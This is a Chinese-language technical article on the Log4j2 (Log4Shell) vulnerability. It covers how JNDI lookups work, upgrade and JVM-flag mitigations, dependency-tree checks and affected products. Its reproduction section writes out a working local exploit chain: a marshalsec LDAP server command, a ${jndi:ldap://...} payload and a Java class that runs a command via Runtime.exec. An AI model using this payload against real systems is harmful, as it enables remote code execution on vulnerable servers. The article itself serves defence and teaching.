# Log4j2漏洞

Log4j2是Apache广为使用的底层日志框架，是Log4j的升级版，很多知名软件、服务都采用此日志框架，2021年11月24日由阿里云安全团队发现Log4j2漏洞并通知了Apache，随后，Apache于12月9日公开该漏洞，CVSS将此漏洞评级为最高级——10级。

## 影响版本

Apache log4j: 2.0 - 2.16.0版本，安全版本为：log4j-2.17.0。

Log4j 1.x版本详见下文。

## 漏洞原理

Log4J2提供了Lookup的功能，允许在输出日志的时候，去查找要输出的内容，其中提供了多种查找方式。

其中就包括JNDI（Java Naming and Directory Interface），即Java命名和目录接口，是用于从Java应用程序中访问名称和目录服务的一组API，使开发人员在开发过程中可以使用名称来访问对象。

类似的，`${jndi:<URL>}`就可以被识别，通过JNDI协议，**就可以将不可信任的资源，如Java对象加载并执行**。

如图所示：

![img](Log4j2%E6%BC%8F%E6%B4%9E_assets/log4j-attack-and-mitigations.png)

## 漏洞复现

### 简单输出

使用漏洞Jar包，添加log4j2.xml配置，日志输出JNDI地址，如下：

```java
public class SimpleTestLog4j2 {
	private static final Logger logger = LogManager.getLogger(SimpleTestLog4j2.class);
    public static void main(String[] args){
        logger.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
    }
}
```

就会得到如下输出：

```
2021/12/17-10:06:46 [main] DEBUG jndi [(79)] : InitialContextFactory.getInitialContext()
2021/12/17-10:06:46 [main] DEBUG jndi [(136)] : supportDeepBinding=false
2021/12/17-10:06:46 [main] DEBUG jndi [(82)] : Created initial context delegate for local namespace:org.eclipse.jetty.jndi.local.localContextRoot@b3ca52e
2021-12-17 10:06:46,284 main WARN Error looking up JNDI resource [ldap://127.0.0.1:1389/#Exploit]. javax.naming.CommunicationException: 127.0.0.1:1389 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
at com.sun.jndi.ldap.Connection.<init>(Connection.java:238)
at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609)
at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
...
```

### 模拟JNDI服务

1. 搭建JNDI服务，提供目标对象

   下载[ marshalsec](https://github.com/mbechler/marshalsec) Jar，并通过如下命令启动（访问对应URL即可以获取到对应的Exploit对象）：

   ```
   $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:7777/#Exploit" 8888
   ```

2. 创建class目标对象

   ```java
   public class Exploit {
       static {
           System.err.println("Pwned");
           try {
               //打开Mac计算器
               String[] commands = {"open", "/System/Applications/Calculator.app"};
               ///打开Windows计算器
   			//String[] commands = {"calc"};
               Runtime.getRuntime().exec(commands);
           } catch ( Exception e ) {
               e.printStackTrace();
           }
       }
   }
   ```

   编译成class文件供上述服务提供：

   ```
   $ javac Exploit
   ```

3. 打印日志测试

   ```java
   public class Log4jBugTest {
       private static final Logger logger = LogManager.getLogger(Log4jBugTest.class);
       public static void main(String[] args) {
           logger.error("${jndi:ldap://localhost:8888/#Exploit}");
       }
   }
   ```
   
4. 然后我们就可以看到计算器被打开了

   ![image-20211215230444415](Log4j2%E6%BC%8F%E6%B4%9E_assets/exploit_reproduce_localhost.png)

**我们可以看到，这里地址是localhost，class文件是打开计算器命令，如果地址换成攻击者的地址，class文件也替换掉，那将非常危险。**

## 修复

### 临时方案

- JVM参数关闭Lookup

  一些软件可能需要一定时间替换最新版本，可以通过设置JVM启动参数的方式临时解决：

  ```
  -Dlog4j2.formatMsgNoLookups=true
  ```

- 同时可以通过设置环境变量

  ```
  JAVA_OPTS=-Dlog4j2.formatMsgNoLookups=true
  ```

- JDK

  使用版本高于 `6u211`、`7u201`、 `8u191`、 `11.0.1`的JDK的服务是不受影响，这些JDK版本中， `com.sun.jndi.ldap.object.trustURLCodebase` 默认是`false`。

  但此方案也仅仅可以作为临时方案，

### 永久方案

原理就是将漏洞Jar包替换为2.17.0版本。

### 查看依赖树

#### gradle

```
$ gradle dependencies
```

或内部分为多个项目：

```
$ gradle app:dependencies
```

app为你的项目名

或者进行搜索`org.apache.logging.log4j:log4j-core`

```
$ gradle :backend:dependencyInsight --dependency org.apache.logging.log4j:log4j-core  --configuration compile
```

例如：hive-jdbc中包含了`log4j-core:2.6.2`

```
$ gradle :backend:dependencyInsight --dependency org.apache.logging.log4j:log4j-core  --configuration compile

> Task :backend:dependencyInsight
org.apache.logging.log4j:log4j-core:2.6.2
   variant "runtime" [
      org.gradle.status = release (not requested)
   ]

org.apache.logging.log4j:log4j-core:2.6.2
\--- org.apache.logging.log4j:log4j-web:2.6.2
     \--- org.apache.hive:hive-common:2.3.7
          +--- org.apache.hive:hive-jdbc:2.3.7
          |    \--- project :warehouse
          |         \--- compile
          +--- org.apache.hive:hive-llap-server:2.3.7
          |    \--- org.apache.hive:hive-service:2.3.7
          |         \--- org.apache.hive:hive-jdbc:2.3.7 (*)
          +--- org.apache.hive:hive-llap-tez:2.3.7
          |    \--- org.apache.hive:hive-llap-server:2.3.7 (*)
          +--- org.apache.hive:hive-llap-client:2.3.7
          |    +--- org.apache.hive:hive-llap-server:2.3.7 (*)
          |    \--- org.apache.hive:hive-llap-tez:2.3.7 (*)
          +--- org.apache.hive:hive-llap-common:2.3.7
          |    +--- org.apache.hive:hive-llap-server:2.3.7 (*)
          |    \--- org.apache.hive:hive-llap-client:2.3.7 (*)
          \--- org.apache.hive:hive-serde:2.3.7
               +--- org.apache.hive:hive-jdbc:2.3.7 (*)
               +--- org.apache.hive:hive-metastore:2.3.7
               |    +--- org.apache.hive:hive-jdbc:2.3.7 (*)
               |    \--- org.apache.hive:hive-service:2.3.7 (*)
               +--- org.apache.hive:hive-llap-server:2.3.7 (*)
               \--- org.apache.hive:hive-llap-common:2.3.7 (*)
```

#### maven

```
$ mvn dependency:tree
```

或者添加过滤条件：

```
$ mvn dependency:tree -Dincludes="org.apache.logging.log4j" 
```

例如：hive-jdbc中包含了`log4j-core:2.6.2`

```
$ mvn dependency:tree -Dincludes="org.apache.logging.log4j" 
com.junnanwu:maven_project:jar:1.0-SNAPSHOT`
\- org.apache.hive:hive-jdbc:jar:3.1.0:compile
   \- org.apache.hive:hive-common:jar:3.1.0:compile
      +- org.apache.logging.log4j:log4j-1.2-api:jar:2.10.0:compile
      |  +- org.apache.logging.log4j:log4j-api:jar:2.10.0:compile
      |  \- org.apache.logging.log4j:log4j-core:jar:2.10.0:compile
      +- org.apache.logging.log4j:log4j-web:jar:2.10.0:compile
      \- org.apache.logging.log4j:log4j-slf4j-impl:jar:2.10.0:compile
```

### 替换jar包

注意：

- **具体需要排除哪个jar包？**

  `log4j-web`包含了`log4j-api`和`log4j-core`，其中`log4j-api`为接口，`log4j-core`为实现，其中主要起作用的的是`log4j-core`。

  另外，`org.slf4j`的`slf4j-log4j12`是slf4j和log4j2的桥接包，使得slf4j接口可以使用logj2这个日志实现。

- **log4j-api需要排除吗？**

  仅导入`log4j-api`，打印：

  ```java
  @Log4j2
  public class TestHive {
      public static void main(String[] args) throws ClassNotFoundException, SQLException {
          log.error("${jndi:ldap://127.0.0.1:1389/#Exploit}");
      }
  }
  ```

  报错：

  ```
  ERROR StatusLogger Log4j2 could not find a logging implementation. Please add log4j-core to the classpath. Using SimpleLogger to log to the console...
  ERROR TestHive ${jndi:ldap://127.0.0.1:1389/#Exploit}
  ```

  没有日志实现是无法打印是日志的，也就更没有办法Look up了。

  那么使用`log4j-api`配合其他日志实现是否存在问题呢？

  测试`log4j-api`+`log4j-to-slf4j`+`slf4j-api`+`logback-classic`，导入相关依赖，然后依然执行上述打印语句，是可以正常打印的：

  ```
  logback: 2021/12/21-11:31:59 [main] ERROR com.junnanwu.TestHive [(25)] : ${jndi:ldap://127.0.0.1:1389/#Exploit}
  ```

**结论：只要没有log4j-core相关漏洞Jar即可，只有log4j-api并无法实现漏洞。**当然如果需要替换的话，当然接口和现实都替换掉，保证版本一致，是最好的。

**排除相关jar包**

排除相关依赖jar包，直至依赖树中不出现漏洞Jar包。

gradle:

```
compile('org.apache.hive:hive-jdbc:2.3.7') {
	exclude group: "org.apache.logging.log4j", module: "log4j-1.2-api"
	exclude group: "org.apache.logging.log4j", module: "log4j-web"
}
```

**引入新Jar包**

将上述漏洞Jar包替换为**2.17.0**版本：

```xml
implementation group: 'org.apache.logging.log4j', name: 'log4j-api', version: '2.17.0'
implementation group: 'org.apache.logging.log4j', name: 'log4j-core', version: '2.17.0'
```

2.16.0版本默认关闭了JNDI，需要显式的配置，同时限制了协议类型，另外，需要显式的允许开启访问外网host。

2.17.0版本修复了由自引用 lookups 的导致的不受控制的递归漏洞，攻击者可以制作包含递归查找的恶意输入数据，导致 StackOverflowError。

>Apache Log4j2 versions 2.0-alpha1 through 2.16.0, excluding 2.12.3, did not protect from uncontrolled recursion from self-referential lookups. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. This is also known as a DOS (Denial of Service) attack.

## log4j1.x

也被发现了漏洞，不过风险要比Log4j 2低得多，[参考此](https://access.redhat.com/security/cve/CVE-2021-4104)。

只有那些使用了JMSAppender的应用会影响，但是这个并不是默认配置。

>Note this flaw ONLY affects applications which are specifically configured to use JMSAppender, which is not the default, or when the attacker has write access to the Log4j configuration for adding JMSAppender to the attacker's JMS Broker.

不过也建议升级到2.17.0。

## 实践指南

可以[点击这里](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)查看受影响的应用。

### Maven依赖

目前已知Hive JDBC Driver依赖中包含漏洞Jar包。

### ElasticSearch

详见[官方贴](https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476)

影响版本：

7.16.2 和 6.8.22之前版本。

>Elasticsearch 5 is susceptible to both remote code execution and an information leak via DNS. 
>
>We’ve confirmed that the Security Manager mitigates the remote code execution attack in Elasticsearch 6 and 7.

临时措施：

JVM开启 `-Dlog4j2.formatMsgNoLookups=true` 并重启所有节点。

配置文件：elasticsearch/config/jvm.options

永久措施：

将Elasticsearch升级到7.16.2或6.8.22版本，这些版本使用了最新的log4j (2.17.0)。

### ClickHouse

[参见此](https://altinity.com/blog/cve-2021-44228-log4j-vulnerability-and-clickhouse)

ClickHouse本身使用C++编写，不受此漏洞影响，但是需要注意使用的ClickHouse JDBC，使用了Log4j 1.2，参考[log4j1.x](#log4j1.x)

### ZooKeeper

[详见此](https://issues.apache.org/jira/browse/ZOOKEEPER-4423)

### Atlassian

Atlassian系列产品（Jira、Bitbucket、Confluence）部分使用了[log4j 1.x](#log4j1.x)，未经特殊配置，不受影响，详情查看[官方文档](https://confluence.atlassian.com/security/multiple-products-security-advisory-log4j-vulnerable-to-remote-code-execution-cve-2021-44228-1103069934.html)。

### 腾讯云

在弹性 MapReduce 服务中 flink、hive、ranger、 presto、 oozie 、knox 、 storm 、druid 等组件有受此漏洞影响，详情参考[腾讯云文档](https://cloud.tencent.com/document/product/589/66710)。

## JNDI

JNDI（Java Naming and Directory Interface）Java命名和目录接口，是用于从Java应用程序中访问名称和目录服务的一组API。

JNDI就是一组API规范，有着不同的实现，例如Tomcat和JBoss都分别实现了JNDI。

### JNDI架构

JNDI通常分为三层：

- JNDI API：用于与Java应用程序与其通信，这一层把应用程序和实际的数据源隔离开来。因此无论应用程序是访问LDAP、RMI、DNS还是其他的目录服务，跟这一层都没有关系。
- Naming Manager：也就是我们提到的命名服务；
- JNDI SPI（Server Provider Interface）：用于具体到实现的方法上。

如下图所示：



![JNDI Architecture](Log4j2%E6%BC%8F%E6%B4%9E_assets/jndi_arch.gif)

### JNDI的应用

JNDI的基本使用操作就是：先创建一个对象，然后放到容器环境中，使用的时候再拿出来。

在真实应用中，通常是由系统程序或框架程序先将资源对象绑定到JNDI环境中，后续在该系统或框架中运行的模块程序就可以从JNDI环境中查找这些资源对象了。

关于JDNI与我们实践相结合的一个例子是JDBC的使用。在没有基于JNDI实现时，连接一个数据库通常需要：加载数据库驱动程序、连接数据库、操作数据库、关闭数据库等步骤。而不同的数据库在对上述步骤的实现又有所不同，参数也可能发生变化。

如果把这些问题交由J2EE容器来配置和管理，程序就只需对这些配置和管理进行引用就可以了。

以Tomcat服务器为例，在启动时可以创建一个连接到某种数据库系统的数据源（DataSource）对象，并将该数据源（DataSource）对象绑定到JNDI环境中，以后在这个Tomcat服务器中运行的Servlet和JSP程序就可以从JNDI环境中查询出这个数据源（DataSource）对象进行使用，而不用关心数据源（DataSource）对象是如何创建出来的。



## References

1. https://mp.weixin.qq.com/s/zXzJVxRxMUnoyJs6_NojMQ
2. https://docs.oracle.com/javase/tutorial/jndi/overview/index.html
3. https://en.wikipedia.org/wiki/Log4Shell
4. https://github.com/mbechler/marshalsec
5. https://zhuanlan.zhihu.com/p/444103520
6. https://logging.apache.org/log4j/2.x/
7. https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/
8. https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
9. https://altinity.com/blog/cve-2021-44228-log4j-vulnerability-and-clickhouse
10. https://confluence.atlassian.com/security/multiple-products-security-advisory-log4j-vulnerable-to-remote-code-execution-cve-2021-44228-1103069934.html
11. https://access.redhat.com/security/cve/CVE-2021-4104
12. https://www.lunasec.io/docs/blog/log4j-zero-day-mitigation-guide/
13. https://cloud.tencent.com/document/product/589/66710
